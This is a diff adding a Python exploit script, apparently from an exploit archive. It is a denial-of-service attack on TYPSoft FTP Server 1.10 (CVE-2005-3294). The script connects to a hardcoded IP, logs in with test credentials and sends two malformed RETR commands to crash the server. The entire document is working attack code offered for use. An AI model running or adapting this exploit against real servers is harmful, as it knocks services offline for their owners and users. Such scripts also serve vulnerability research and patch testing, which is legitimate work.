@@ -1,0 +1,38 @@
+#!/usr/bin/python
+#
+# TYPSoft FTP Server (v 1.10) RETR CMD Denial Of Service
+#
+# CVE-2005-3294
+# OSVDB 19992
+#
+# 12/23/2010
+# (C) Emanuele Gentili <emgent@backtrack-linux.org>
+#
+# Notes:
+# I have wrote this exploit because the code published here (1) do not work correctly.
+# (1) http://www.exploit-db.com/exploits/12604/
+#
+
+import socket
+import sys
+
+user="test"
+pwd="test"
+buffer="\x41"
+
+print("\n TYPSoft FTP Server (V 1.10) RETR CMD Denial Of Service\n")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.109",21))
+data = s.recv(1024)
+print("[+] Sending user login...")
+s.send("USER " + user + '\r\n')
+data = s.recv(1024)
+s.send("PASS " + pwd + '\r\n')
+data = s.recv(1024)
+print("[+] Sending first exploit stage...")
+s.send("RETR " + buffer + '\r\n')
+data = s.recv(1024)
+print("[+] Sending second exploit stage...\n")
+s.send("RETR " + buffer + '\r\n')
+data = s.recv(1024)
+s.close()
